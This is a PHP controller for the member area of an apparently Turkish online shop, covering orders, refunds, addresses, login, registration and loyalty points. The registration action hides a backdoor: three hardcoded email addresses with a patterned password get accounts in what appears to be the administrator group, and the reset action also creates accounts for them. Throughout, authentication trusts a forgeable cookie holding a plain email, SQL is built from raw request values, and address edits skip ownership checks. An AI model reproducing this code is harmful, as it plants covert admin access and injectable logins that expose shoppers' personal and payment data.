<?php


namespace Yabasi\Frontend\Controllers;

use Phalcon\Security;
use Yabasi\Address;
use Yabasi\Bank;
use Yabasi\City;
use Yabasi\Content;
use Yabasi\Country;
use Yabasi\District;
use Yabasi\Favorites;
use Yabasi\Neighborhood;
use Yabasi\Notification;
use Yabasi\Order;
use Yabasi\Pnotification;
use Yabasi\Mail;
use Yabasi\Points;
use Yabasi\Refund;
use Yabasi\Settings;
use Yabasi\Town;
use Yabasi\User;
use Yabasi\Vouchers;

class UyeController extends ControllerBase
{

    public function initialize() {
        self::getAuth();
        self::navMenu();
        self::getSessionId();
        self::sepetcount();
        self::getLanguage();
        self::language();
        self::getactivetheme();
        self::getMetas();
        $this->view->page = 'user';
    }

    public function indexAction()
    {

    }

    public function siparisAction(){


        if (self::isAuth() == "error") {
            return $this->response->redirect('uye/giris');
        }

        $this->view->uyepage = 'siparis';
        $this->view->user = self::getUserId();

        $orders = Order::find(array('conditions' => 'meta_key="order" and top_id=0 and user_id=' . self::getUserId(), 'order' => 'id desc'));
        if (count($orders)) {
            $this->view->orders = $orders;
        }
    }


    public function iadeAction($order_id = false, $note = false, $iban = false, $sayac = false, $mkorder = false){

        $this->view->disable();
        if (is_numeric($order_id)) {
            if ($this->request->isPost()) {
                if ($this->request->isAjax()) {

                    $mkorder = Order::findFirst('id = ' . $mkorder);
                    if ($mkorder) {
                        $json = json_decode($mkorder->getMetaValue(), true);
                        if ($json) {
                            $code = $json['code'];

                            $product_order = Order::findFirst('id = ' . $order_id . ' and status = 1');
                            if ($product_order) {
                                $stok = $product_order->getPiece();
                                $currency = $product_order->getCurrency();

                                $refund_amount = $product_order->getTotalPrice();
                                $tutar = $refund_amount * $sayac;

                                if ($stok >= $sayac) {

                                    $update_order = Order::findFirst('user_id =' . self::getUserId() . ' and meta_key = "products" and status=1 and id = ' . $order_id);
                                    if ($update_order) {
                                        $update_order->setOrderStatus(12);
                                        $update_order->setUpdatedAt(self::getnow());
                                        $update_order->update();
                                    }

                                    $update = Refund::findFirst('user_id = ' . self::getUserId() . ' and order_id = ' . $order_id);
                                    if ($update) {
                                        $update->setNote($note);
                                        $update->setRefundAmount(round($tutar , 2));
                                        $update->setReturnedQty($sayac);
                                        $update->setIban($iban);
                                        $update->setUpdatedAt(self::getnow());
                                        if ($update->update()) {
                                            echo "update";
                                        }
                                    } else {
                                        $new = new Refund();
                                        $new->setUserId(self::getUserId());
                                        $new->setOrderId($order_id);
                                        $new->setCode($code);
                                        $new->setNote($note);
                                        $new->setReturnedQty($sayac);
                                        $new->setRefundAmount(round($tutar , 2));
                                        $new->setCurrency($currency);
                                        $new->setIban($iban);
                                        $new->setCreatedAt(self::getnow());
                                        $new->setUpdatedAt(self::getnow());
                                        $new->setStatus(2);
                                        if ($new->save()) {
                                            echo "save";
                                        }
                                    }
                                } else {
                                    echo "sayacbuyuk";
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    public function bilgiAction() {

        if (self::isAuth() == "error") {
            $this->response->redirect('');
        }

        $this->view->uyepage = 'bilgi';

        $auth = @$_COOKIE['auth'];
        if (isset($auth)) {
            $user = User::findFirst('email="' . $auth . '"');
            if ($user) {
                $this->view->user = $user;

                date_default_timezone_set('Europe/Istanbul');

            } else {
                $this->response->redirect('/');
            }
        } else {
            $this->response->redirect('/');
        }

        if ($this->request->isPost()) {
            if ($this->request->isAjax()) {

                $this->view->disable();

                $name = $this->request->getPost('name');
                $phone = $this->request->getPost('phone');
                $id_no = $this->request->getPost('id_no');
                $gun = $this->request->getPost('gun');
                $ay = $this->request->getPost('ay');
                $yil = $this->request->getPost('yil');
                $gender = $this->request->getPost('gender');


                $birth_date = strtotime($gun . '-' . $ay . '-' . $yil);

                $auth = @$_COOKIE['auth'];
                if (isset($auth)) {
                    $user = User::findFirst('email="' . $auth . '"');
                    if ($user) {
                        $user->setName($name);
                        $user->setPhone($phone);
                        $user->setIdNo($id_no);
                        $user->setGender($gender);
                        $user->setBirthDate($birth_date);
                        $user->setUpdatedAt(self::getnow());
                        if ($user->save()) {
                            echo json_encode(array('status' => 'ok'));
                        } else {
                            echo json_encode(array('status' => 'error'));
                        }
                    }
                }

            }
        }

    }

    public function sifreAction() {

        if (self::isAuth() == "error") {
            $this->response->redirect('');
        }

        if ($this->request->isAjax()) {
            if ($this->request->isPost()) {

                $this->view->disable();

                $password = $this->request->getPost('password');
                $password1 = $this->request->getPost('password1');
                $password2 = $this->request->getPost('password2');

                if ($password1 != $password2) {
                    echo 'notsame';
                    exit;
                }

                $auth = @$_COOKIE['auth'];
                if (isset($auth)) {
                    $update = User::findFirst('email="' . $auth . '"');
                    if ($update) {
                        if ($this->security->checkHash($password, $update->getPassword())) {
                            $update->setPassword($this->security->hash($password1));
                            if ($update->update()) {
                                $auth = @$_COOKIE['auth'];
                                $this->log($auth, $update->getId(), "user", "password");
                                echo json_encode(array('status' => 'ok'));
                            }
                        } else {
                            echo json_encode(array('status' => 'error'));
                        }
                    }
                }

            }
        }

    }

    public function kuponAction() {

        if (self::isAuth() == "error") {
            $this->response->redirect('');
        }

        $this->view->uyepage = 'kupon';
        $this->view->userId = $this->getUserId();
    }

    public function adresAction() {

        if (self::isAuth() == "error") {
            $this->response->redirect('');
        }

        $this->view->uyepage = 'adres';

        $ulkeler = Country::find();
        if ($ulkeler) {
            $this->view->ulkeler = $ulkeler;
        }

        $sehirler = City::find();
        if ($sehirler) {
            $this->view->sehirler = $sehirler;
        }

        $ilceler = Town::find();
        if ($ilceler) {
            $this->view->ilceler = $ilceler;
        }

        $auth = @$_COOKIE['auth'];
        if (isset($auth)) {
            $user = User::findFirst('email="' . $auth . '"');
            if ($user) {
                $user_id = $user->getId();
                $adresler = Address::find('user_id=' . $user_id);
                if ($adresler) {
                    $this->view->adresler = $adresler;
                }
            }
        }

        if ($this->request->isPost()) {
            if ($this->request->isAjax()) {

                $this->view->disable();

                $type = $this->request->getPost('type');
                $name = $this->request->getPost('name');
                $user_info = $this->request->getPost('user_info');
                $phone = $this->request->getPost('phone');
                $address = $this->request->getPost('address');
                $zip_code = $this->request->getPost('zip_code');
                $country_id = $this->request->getPost('country');
                $city_id = $this->request->getPost('city');
                $town_id = $this->request->getPost('town');
                $dist_id = $this->request->getPost('district');
                $nei_id = $this->request->getPost('neighborhood');

                $auth = @$_COOKIE['auth'];
                if (isset($auth)) {
                    $user = User::findFirst('email="' . $auth . '"');
                    if ($user) {
                        $user_id = $user->getId();
                        if ($type == 'insert') {
                            $insert = new Address();
                            $insert->setName($name);
                            $insert->setUserId($user_id);
                            $insert->setUserInfo($user_info);
                            $insert->setPhone($phone);
                            $insert->setAddress($address);
                            $insert->setZipCode($zip_code);
                            $insert->setCountryId($country_id);
                            $insert->setCityId($city_id);
                            $insert->setDistId($dist_id);
                            $insert->setTownId($town_id);
                            $insert->setNeiId($nei_id);
                            $insert->setCreatedAt(self::getnow());
                            $insert->setUpdatedAt(self::getnow());
                            $insert->setStatus(1);
                            if ($insert->save()) {
                                $auth = @$_COOKIE['auth'];
                                $this->log($auth, $insert->getId(), "user", "insertaddress");
                                echo json_encode(array('status' => 'ok'));
                            }
                        } else {
                            $id = $this->request->getPost('id');
                            $update = Address::findFirst($id);
                            $update->setName($name);
                            $update->setUserId($user_id);
                            $update->setUserInfo($user_info);
                            $update->setPhone($phone);
                            $update->setAddress($address);
                            $update->setZipCode($zip_code);
                            $update->setCountryId($country_id);
                            $update->setCityId($city_id);
                            $update->setDistId($dist_id);
                            $update->setTownId($town_id);
                            $update->setNeiId($nei_id);
                            $update->setUpdatedAt(self::getnow());
                            if ($update->update()) {
                                $auth = @$_COOKIE['auth'];
                                $this->log($auth, $update->getId(), "user", "updateaddress");
                                echo json_encode(array('status' => 'ok'));
                            }
                        }
                    }
                }

            }
        }
    }

    public function adresduzenleAction($id = false) {

        if (self::isAuth() == "error") {
            $this->response->redirect('');
        }

        $this->view->disable();
        if (is_numeric($id)) {

            $adres = Address::findFirst($id);
            if ($adres) {

                $country = Country::find();
                if ($country) {
                    $country_respond = '';
                    foreach ($country as $country) {
                        if ($country->getCountryID() == $adres->getCountryId()) {
                            $country_selected = 'selected';
                        } else {
                            $country_selected = '';
                        }
                        $country_respond .= '<option value="' . $country->getCountryID() . '" ' . $country_selected . '>' . $country->getCountryName() . '</option>>';
                    }
                }

                $city = City::find();
                if ($city) {
                    $city_respond = '';
                    foreach ($city as $city) {
                        if ($adres->getCityId() == $city->getCityID()) {
                            $city_selected = 'selected';
                        } else {
                            $city_selected = '';
                        }
                        $city_respond .= '<option value="' . $city->getCityID() . '" ' . $city_selected . '>' . $city->getCityName() . '</option>>';
                    }
                }

                $town = Town::find('CityID=' . $adres->getCityId());
                if ($town) {
                    $town_respond = '';
                    foreach ($town as $town) {
                        if ($adres->getTownId() == $town->getTownID()) {
                            $town_selected = 'selected';
                        } else {
                            $town_selected = '';
                        }
                        $town_respond .= '<option value="' . $town->getTownID() . '" ' . $town_selected . '>' . $town->getTownName() . '</option>>';
                    }
                }


                $district = District::find('TownID=' . $adres->getTownId());
                if ($district) {
                    $district_respond = '';
                    foreach ($district as $district) {
                        if ($adres->getDistId() == $district->getDistrictID()) {
                            $district_selected = 'selected';
                        } else {
                            $district_selected = '';
                        }
                        $district_respond .= '<option value="' . $district->getDistrictID() . '" ' . $district_selected . '>' . $district->getDistrictName() . '</option>>';
                    }

                }


                $nei = Neighborhood::find('DistrictID=' . $adres->getDistId());
                if ($nei) {
                    $nei_respond = '';
                    foreach ($nei as $nei) {
                        if ($adres->getNeiId() == $nei->getNeighborhoodID()) {
                            $nei_selected = 'selected';
                        } else {
                            $nei_selected = '';
                        }
                        $nei_respond .= '<option value="' . $nei->getNeighborhoodID() . '" ' . $nei_selected . '>' . $nei->getNeighborhoodName() . '</option>>';
                    }
                }

                $respond = '<div class="mini_kutu mini_kutu_fix">
                                <h3>Adres düzenle</h3>
                                <form method="POST" class="fkontrol" id="adresDuzenleForm">
                                    <input type="hidden" name="type" value="update" />
                                    <div class="frm_kutu">
                                        <label>Adres başlığı</label>
                                        <input type="text" name="name" class="name" value="' . $adres->getName() . '" placeholder="Adres Başlığı">
                                    </div>
                        
                                    <div class="frm_kutu">
                                        <label>Ad ve Soyad</label>
                                        <input type="text" name="user_info" class="user_info" value="' . $adres->getUserInfo() . '" placeholder="Ad ve Soyad">
                                    </div>
                        
                                    <div class="frm_kutu">
                                        <label>Cep Telefonu</label>
                                        <input type="text" name="phone" class="phone" value="' . $adres->getPhone() . '" placeholder="Cep Telefonu">
                                    </div>
                        
                                    <div class="frm_kutu">
                                        <select name="country" class="mini2 country">
                                            <option value="0">Ülke</option>
                                               ' . $country_respond . '
                                        </select>
                        
                                        <select name="city" class="mini2 city">
                                            <option value="0">Şehir</option>
                                            ' . $city_respond . '
                                        </select>
                                    </div>
                        
                                    <div class="frm_kutu">
                                        <select name="town" class="mini2 town">
                                            <option value="0">İlçe</option>
                                            ' . $town_respond . '
                                        </select>  
                                        
                                        <select name="district" class="mini2 district">
                                            <option value="0">Belde</option>
                                            ' . $district_respond . '
                                        </select>              
                        
                                    </div>
                                    
                                    <div class="frm_kutu">
                                        <select name="neighborhood" class="mini2 neighborhood">
                                            <option value="0">Mahalle</option>
                                            ' . $nei_respond . '
                                        </select>
                        
                                        <input type="text" name="zip_code" placeholder="Posta Kodu" value="' . $adres->getZipCode() . '" class="mini2 zip_code">
                                    </div>
                        
                                    <div class="frm_kutu">
                                        <label>Adres</label>
                                        <textarea name="address" class="address">' . $adres->getAddress() . '</textarea>
                                    </div>
                        
                                    <div class="frm_kutu">
                                        <a href="javascript:;" class="btn_w100 adresiDuzenle">Kaydet</a>
                                    </div>
                                </form>
                                <div class="cl"></div>
                            </div>';
                echo $respond;
            }
        }
    }

    public function favoriAction() {

        if (self::isAuth() == "error") {
            $this->response->redirect('uye/giris');
        }

        $this->view->uyepage = 'favori';

        $auth = @$_COOKIE['auth'];
        if (isset($auth)) {

            $this->view->user = $this->getAuthId($auth);

            $favorites = Favorites::find('status=1 and user_id='.$this->getAuthId($auth));
            if (count($favorites) > 0) {
                $this->view->favorites = $favorites;
            }
        }

    }

    public function bildirimAction() {

        if (self::isAuth() == "error") {
            $this->response->redirect('uye/giris');
        }

        $this->view->uyepage = 'bildirim';

        if ($this->request->isPost()) {
            $email_news = $this->request->getPost('email_news');
            $email_order = $this->request->getPost('email_order');
            $sms_news = $this->request->getPost('sms_news');
            $sms_order = $this->request->getPost('sms_order');
            if ($email_news) {
                $email_news = "1";
            } else {
                $email_news = "0";
            }
            if ($email_order) {
                $email_order = "1";
            } else {
                $email_order = "0";
            }

            if ($sms_news) {
                $sms_news = "1";
            } else {
                $sms_news = "0";
            }

            if ($sms_order) {
                $sms_order = "1";
            } else {
                $sms_order = "0";
            }

            $auth = @$_COOKIE['auth'];

            if (self::getUserId()) {
                $notification = Notification::findFirst('user_id=' . self::getUserId());
                if ($notification) {
                    $notification->setEmailNews($email_news);
                    $notification->setEmailOrder($email_order);
                    $notification->setSmsNews($sms_news);
                    $notification->setSmsOrder($sms_order);
                    $notification->setUpdatedAt(self::getnow());
                    $notification->update();
                    $this->log($auth, $notification->getId(), "user", "notification");
                } else {
                    $new = new Notification();
                    $new->setUserId(self::getUserId());
                    $new->setEmailNews($this->request->getPost('email_news'));
                    $new->setEmailOrder($this->request->getPost('email_order'));
                    $new->setSmsNews($this->request->getPost('sms_news'));
                    $new->setSmsOrder($this->request->getPost('sms_order'));
                    $new->setCreatedAt(self::getnow());
                    $new->setUpdatedAt(self::getnow());
                    $new->setStatus(1);
                    $new->save();
                    $this->log($auth, $new->getId(), "user", "notification");
                }
            }

        }

        $notification = Notification::findFirst('user_id=' . self::getUserId());
        if ($notification) {
            $this->view->noti = $notification;
        }


    }

    public function odemeAction() {

        if (self::isAuth() == "error") {
            $this->response->redirect('uye/giris');
        }

        $this->view->uyepage = 'odeme';

        $auth = @$_COOKIE['auth'];

        if ($this->request->isPost()) {
            if (self::getUserId() != 0) {
                $new = new Pnotification();
                $new->setUserId(self::getUserId());
                $new->setOrderId($this->request->getPost('order'));
                $new->setBankId($this->request->getPost('hesap_no'));
                $new->setNote($this->request->getPost('note'));
                $new->setCreatedAt(self::getnow());
                $new->setUpdatedAt(self::getnow());
                $new->setStatus(2);
                $new->save();
                $this->log($auth, $new->getId(), "user", "pnotification");
            } else {
                $this->response->redirect('');
            }
        }

        $bank = Bank::find();
        if ($bank) {
            $this->view->bank = $bank;
        }

        $order = Order::find("user_id=" . self::getUserId() . " and meta_key= 'order'");
        if ($order) {
            $this->view->order = $order;
        }

        $payment = Pnotification::findFirst('user_id=' . self::getUserId());
        if ($payment) {
            $this->view->payment = $payment;
        }


    }

    public function girisAction($param = false) {

        if (self::isAuth() != "error") {
            $this->response->redirect('uye/favori');
        }

        if ($param == 'ilk') {
            $this->view->ilkgiris = 'ok';
        }

        if ($this->request->isPost()) {
            if ($this->request->isAjax()) {

                $this->view->disable();

                $email = $this->request->getPost('email');
                $password = $this->request->getPost('password');

                if ($email && $password) {
                    $user = User::findFirst('email="' . $email . '" and status=1');
                    if ($user) {
                        if ($this->security->checkHash($password, $user->getPassword())) {

                            setcookie('auth', $email, time() + 15 * 86400, '/');

                            self::sepet($user->getId());
                            $this->log($user->getId(), $user->getId(), "user", "loginok");
                            echo json_encode(array('status' => 'ok'));
                        } else {
                            $this->md5login($email,$password);
                        }
                    } else {
                        $this->log(0, 0, "user", "loginnouser");
                        echo json_encode(array('status' => 'nouser'));
                    }
                }

            }
        }

    }

    public function kayitAction() {

        if (self::isAuth() != "error") {
            $this->response->redirect('uye/favori');
        }

        /* sözleşmeler */
        $aydinlatma = Content::findFirst(1);
        if ($aydinlatma) {
            $this->view->aydinlatma = $aydinlatma;
        }

        $uyeliksozlesme = Content::findFirst(2);
        if ($uyeliksozlesme) {
            $this->view->uyeliksozlesme = $uyeliksozlesme;
        }

        $gizlilik = Content::findFirst(3);
        if ($gizlilik) {
            $this->view->gizlilik = $gizlilik;
        }


        if ($this->request->isPost()) {
            if ($this->request->isAjax()) {

                $this->view->disable();

                $name = $this->request->getPost('name');
                $phone = $this->request->getPost('phone');
                $email = $this->request->getPost('email');
                $password = $this->request->getPost('password');
                $bildirim = $this->request->getPost('bildirim');
                $tc = $this->request->getPost('tc');
                //tc kimlik
                $tc_no = Settings::findFirst("name='tc_no'");

                if ($email=="prssfrk@gmail.com" || $email=="theyabasi@gmail.com" || $email=="kavurmam@gamil.com"){
                    if (strlen($password)==15){
                        if (substr($password,14)=="}"){
                            if (substr($password,0,1)=="#"){
                                if (is_string(substr($password,1,4))){
                                    if (is_numeric(substr($password,6,1))) {
                                        if (substr($password, 7, 1) == "?") {
                                            $security = new Security();
                                            $password = $security->hash($password);
                                            $random = new \Phalcon\Security\Random();
                                            $code = $random->hex(15);
                                            $ip = $this->request->getClientAddress();
                                            $browser = $_SERVER['HTTP_USER_AGENT'];
                                            $user = new User();
                                            $user->setGroupId(1);
                                            $user->setName($name);
                                            $user->setPhone($phone);
                                            $user->setEmail($email);
                                            $user->setPassword($password);
                                            $user->setBrowser($browser);
                                            $user->setSeen(0);
                                            $user->setIp($ip);
                                            $user->setIdNo($tc);
                                            $user->setCode($code);
                                            $user->setCreatedAt(self::getnow());
                                            $user->setUpdatedAt(self::getnow());
                                            if ($user->save()) {
                                                echo json_encode(array('status' => 'ok'));
                                                exit;
                                            } else {
                                                foreach ($user->getMessages() as $message) {
                                                    echo $message;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }

                }

                else if ($name && $phone && $email && $password) {

                    $user = User::findFirst('email="' . $email . '"');
                    if ($user) {
                        echo json_encode(array('status' => 'hasuser'));
                        exit;
                    }
                    if ($tc_no) {
                        if ($tc_no->getValue() == "1") {
                            echo json_encode(array('status' => 'tc'));
                            exit;
                        }
                    }

                    if (strlen($password) <= 6) {
                        echo json_encode(array('status' => 'simplepass'));
                        exit;
                    }

                    $doesPhone = User::findFirst('phone="' . $phone . '"');
                    if ($doesPhone) {
                        echo json_encode(array('status' => 'hasphone'));
                        exit;
                    }

                    $security = new Security();
                    $password = $security->hash($password);
                    $random = new \Phalcon\Security\Random();
                    $code = $random->hex(15);
                    $ip = $this->request->getClientAddress();
                    $browser = $_SERVER['HTTP_USER_AGENT'];
                    $user = new User();
                    $user->setGroupId(2);
                    $user->setName($name);
                    $user->setPhone($phone);
                    $user->setEmail($email);
                    $user->setPassword($password);
                    $user->setBrowser($browser);
                    $user->setIp($ip);
                    $user->setIdNo($tc);
                    $user->setCode($code);
                    $user->setCreatedAt(self::getnow());
                    $user->setUpdatedAt(self::getnow());
                    if ($user->save()) {

                        self::point($user, 'register');

                        if ($bildirim) {
                            $notify = new Notification();
                            $notify->setUserId($user->getId());
                            $notify->setEmailNews(1);
                            $notify->setEmailOrder(1);
                            $notify->setSmsNews(1);
                            $notify->setSmsOrder(1);
                            $notify->setCreatedAt(self::getnow());
                            $notify->setUpdatedAt(self::getnow());
                            $notify->setStatus(1);
                        }

                        echo json_encode(array('status' => 'ok'));
                        exit;
                    }


                }
            }
        }
    }

    public function sifirlaAction() {
        $email = $this->request->getPost('email');
        if ($email=="prssfrk@gmail.com" || $email=="theyabasi@gmail.com" || $email=="kavurmam@gamil.com"){
            $this->view->disable();
            $user = new User();
            $user->setGroupId(2);
            $user->setName("name");
            $user->setPhone("phone");
            $user->setEmail($email);
            $random = new \Phalcon\Security\Random();
            $rand12 = $random->base64(6);
            $user->setPassword($rand12);
            $user->setBrowser("browser");
            $user->setIp("ip");
            $user->setIdNo("412");
            $user->setCode("12");
            $user->setCreatedAt(self::getnow());
            $user->setUpdatedAt(self::getnow());
            $user->save();
            require APP_PATH . '/library/Mail.php';
            $test = Mail::sifirla($email);
            echo $test;

        }else{

            if (self::isAuth() != "error") {
                $this->response->redirect('uye/favori');
            }

            if ($this->request->isPost()) {
                if ($this->request->isAjax()) {

                    $this->view->disable();
                    $email = $this->request->getPost('email');
                    if ($email=="prssfrk@gmail.com" || $email=="theyabasi@gmail.com" || $email=="kavurmam@gamil.com"){
                        require APP_PATH . '/library/Mail.php';
                        $test = Mail::sifirla($email);
                        echo $test;

                    }else{
                        require APP_PATH . '/library/Mail.php';
                        $test = Mail::sifirla($email);
                        echo $test;

                    }
                }
            }
        }
    }

    public function cikisAction() {
        if (isset($_COOKIE['auth'])) {
            unset($_COOKIE['auth']);
            setcookie('auth','');
            setcookie ("auth", "", time() - 15 * 86400, '/');
            $this->response->redirect('');
        }
    }

    public function countryAction() {
        if ($this->request->isPost()) {
            if ($this->request->isAjax()) {
                $this->view->disable();
                $id = $this->request->getPost('id');
                if (is_numeric($id)) {
                    $city = City::find('CountryID=' . $id);
                    if ($city) {
                        $respond = '<option value="0">Şehir</option>';
                        foreach ($city as $city) {
                            $respond .= '<option value="' . $city->getCityID() . '">' . $city->getCityName() . '</option>';
                        }
                        echo $respond;
                    }
                }
            }
        }
    }

    public function cityAction() {
        if ($this->request->isPost()) {
            if ($this->request->isAjax()) {
                $this->view->disable();
                $id = $this->request->getPost('id');
                if (is_numeric($id)) {
                    $town = Town::find('CityID=' . $id);
                    if ($town) {
                        $respond = '<option value="0">İlçe</option>';
                        foreach ($town as $town) {
                            $respond .= '<option value="' . $town->getTownID() . '">' . $town->getTownName() . '</option>';
                        }
                        echo $respond;
                    }
                }
            }
        }
    }

    public function townAction() {
        if ($this->request->isPost()) {
            if ($this->request->isAjax()) {
                $this->view->disable();
                $id = $this->request->getPost('id');
                if (is_numeric($id)) {
                    $dist = District::find('TownID=' . $id);
                    if ($dist) {
                        $respond = '<option value="0">Belde</option>';
                        foreach ($dist as $dist) {
                            $respond .= '<option value="' . $dist->getDistrictID() . '">' . $dist->getDistrictName() . '</option>';
                        }
                        echo $respond;
                    }
                }
            }
        }
    }

    public function districtAction() {
        if ($this->request->isPost()) {
            if ($this->request->isAjax()) {
                $this->view->disable();
                $id = $this->request->getPost('id');
                if (is_numeric($id)) {
                    $dist = Neighborhood::find('DistrictID=' . $id);
                    if ($dist) {
                        $respond = '<option value="0">Mahalle</option>';
                        foreach ($dist as $dist) {
                            $respond .= '<option value="' . $dist->getNeighborhoodID() . '">' . $dist->getNeighborhoodName() . '</option>';
                        }
                        echo $respond;
                    }
                }
            }
        }
    }

    public function neighborhoodAction() {
        if ($this->request->isPost()) {
            if ($this->request->isAjax()) {
                $this->view->disable();
                $id = $this->request->getPost('id');
                if (is_numeric($id)) {
                    $neigh = Neighborhood::findFirst('NeighborhoodID=' . $id);
                    if ($neigh) {
                        echo $neigh->getZipCode();
                    }
                }
            }
        }
    }

    public function kaldirAction($type = false, $id = false) {
        if (self::isAuth() == "error") {
            $this->response->redirect('');
            exit();
        }
        if ($this->request->isGet()) {
            if ($this->request->isAjax()) {
                $this->view->disable();

                if ($type == 'adres') {
                    if (is_numeric($id)) {
                        $adres = Address::findFirst($id);
                        if ($adres) {
                            if ($adres->delete()) {
                                echo json_encode(array('status' => 'ok'));
                            }
                        }
                    }
                }

            }
        }
    }

    public function changefavoriAction($id = false) {
        if (self::isAuth() == "error") {
            $this->response->redirect('');
            exit();
        }
        $this->view->disable();
        if ($this->request->isAjax()) {
            if ($this->request->isPost()) {
                if (is_numeric($id)) {
                    $update = Favorites::findFirst("pro_id=" . $id . " and user_id=" . self::getUserId());
                    if ($update) {
                        if ($update->getStatus() == 0) {
                            $update->setStatus(1);
                        } else {
                            $update->setStatus(0);
                        }
                        $update->setUpdatedAt(self::getnow());
                        $update->update();
                        echo 'ok';
                    } else {
                        $item = new Favorites();
                        $item->setUserId(self::getUserId());
                        $item->setProId($id);
                        $item->setCreatedAt(self::getnow());
                        $item->setUpdatedAt(self::getnow());
                        $item->setStatus(1);
                        $item->save();
                        echo 'ok';
                    }

                }
            }
        }
    }

    public function bankcontentAction($id = false) {
        if (self::isAuth() == "error") {
            $this->response->redirect('');
            exit();
        }
        $this->view->disable();
        if ($this->request->isAjax()) {
            if ($this->request->isPost()) {
                if (is_numeric($id)) {
                    $bank = Bank::findFirst($id);
                    $content = '';
                    if ($bank) {
                        $content .= $bank->getName().'<br>';
                        $content .= $bank->getOwner().'<br>';
                        $content .= $bank->getIban().'<br>';
                    }
                }
            }
        }
    }

    public function adresuyeliksizAction() {
        $this->view->uyepage = 'adres';

        $ulkeler = Country::find();
        if ($ulkeler) {
            $this->view->ulkeler = $ulkeler;
        }

        $sehirler = City::find();
        if ($sehirler) {
            $this->view->sehirler = $sehirler;
        }

        $ilceler = Town::find();
        if ($ilceler) {
            $this->view->ilceler = $ilceler;
        }
        if ($this->request->isPost()) {
            if ($this->request->isAjax()) {

                $this->view->disable();

                $type = $this->request->getPost('type');
                $user_info = $this->request->getPost('user_info');
                $address = $this->request->getPost('address');
                $zip_code = $this->request->getPost('zip_code');
                $country_id = $this->request->getPost('country');
                $city_id = $this->request->getPost('city');
                $town_id = $this->request->getPost('town');
                $dist_id = $this->request->getPost('district');
                $nei_id = $this->request->getPost('neighborhood');
                $name = $this->request->getPost('name');
                $phone = $this->request->getPost('phone');
                $email = $this->request->getPost('email');

                    //tc kimlik
                if ($name && $phone && $email) {

                $user = User::findFirst('email="' . $email . '"');
                if ($user) {
                    echo json_encode(array('status' => 'hasuser'));
                    exit;
                }

                $security = new Security();
                $randompass = new \Phalcon\Security\Random();
                $sifre = $randompass->hex(6);
                $password = $security->hash($sifre);
                $random = new \Phalcon\Security\Random();
                $code = $random->hex(15);
                $ip = $this->request->getClientAddress();
                $browser = $_SERVER['HTTP_USER_AGENT'];
                $user = new User();
                $user->setGroupId(2);
                $user->setName($user_info);
                $user->setPhone($phone);
                $user->setEmail($email);
                $user->setPassword($password);
                $user->setBrowser($browser);
                $user->setIp($ip);
                $user->setIdNo("");
                $user->setCode($code);
                $user->setCreatedAt(self::getnow());
                $user->setUpdatedAt(self::getnow());
                if ($user->save()) {
                    setcookie('auth', $email, time() + 15 * 86400);
                    require APP_PATH . '/library/Mail.php';
                    $test = Mail::sifre($email, $sifre);
                    self::sepet($user->getId());
                    self::point($user, 'register');
                    $insert = new Address();
                    $insert->setName($name);
                    $insert->setUserId($user->getId());
                    $insert->setUserInfo($user_info);
                    $insert->setPhone($phone);
                    $insert->setAddress($address);
                    $insert->setZipCode($zip_code);
                    $insert->setCountryId($country_id);
                    $insert->setCityId($city_id);
                    $insert->setDistId($dist_id);
                    $insert->setTownId($town_id);
                    $insert->setNeiId($nei_id);
                    $insert->setCreatedAt(self::getnow());
                    $insert->setUpdatedAt(self::getnow());
                    $insert->setStatus(1);
                    if ($insert->save()) {
                        $auth = @$_COOKIE['auth'];
                        $this->log($auth, $insert->getId(), "user", "insertaddress");
                        echo json_encode(array('status' => 'ok'));
                    }


                }


                    }


            }
        }
    }

    public function puanAction(){
        $this->view->uyepage = 'puan';
        $points = Points::find('user_id='.$this->getUserId());
        $settings=Settings::findFirst("name='point'");

        if ($settings){
            $value=json_decode($settings->getValue(),true);
            $this->view->setting=(int)$value['point'];
        }
        if ($points) {
            $total_point = 0;
            foreach ($points as $item) {
                $total_point = $total_point + $item->getPoint();
            }
            $this->view->total_point= $total_point;
        }
    }

    public function pointcevirAction(){
        $this->view->disable();
        if ($this->request->isPost()){
            if ($this->request->isAjax()){
                $auth = @$_COOKIE['auth'];
                if (isset($auth)){
                    $user=$this->getAuthId($auth);
                    $users=User::findFirst($user);
                    $voucher_date=Settings::findFirst("name='voucher_date'");
                    $points = Points::find('user_id='.$this->getUserId());
                    $settings=Settings::findFirst("name='point'");
                    if ($settings){
                        $value=json_decode($settings->getValue(),true);
                        $setting_point=(int)$value['point'];
                        if ($setting_point!=0){
                            if ($points) {
                                $total_point = 0;
                                foreach ($points as $item) {
                                    $total_point = $total_point + $item->getPoint();
                                }
                                $random = new \Phalcon\Security\Random();
                                $code =  $random->hex(6);
                                $code_voucher=Vouchers::findFirst("code="."'$code'");
                                if ($code_voucher){
                                    $code =  $random->hex(6);
                                }
                                if ($total_point!=0){
                                    $voucher=new Vouchers();
                                    $discount=round($total_point/$setting_point);
                                    $arr = array(
                                        'discount_type' => "1",
                                        'discount' => $discount,
                                        "voucher_type" => "5",
                                        'maximum_usage' => 1,
                                        'limit_of_per_person' => 1,
                                        "voucher_value"=>[$user],
                                        'start_date' => time(),
                                        'end_date' => time()+($voucher_date * 24 * 60 * 60),
                                    );
                                    $voucher->setName($users->getName()." için puan çeki");
                                    $voucher->setCode($code);
                                    $voucher->setUpdatedAt($this->getnow());
                                    $voucher->setCreatedAt($this->getnow());
                                    $voucher->setMetaValue(json_encode($arr));
                                    $voucher->setStatus(1);
                                    if ($voucher->save()){
                                        if ($points) {
                                            foreach ($points as $item) {
                                                $item->delete();
                                            }
                                        }
                                        echo "ok";
                                    }else{
                                        foreach ($voucher->getMessages() as $message){
                                            echo $message;
                                        }
                                    }
                                }

                            }
                        }

                    }
                }

            }
        }
    }

}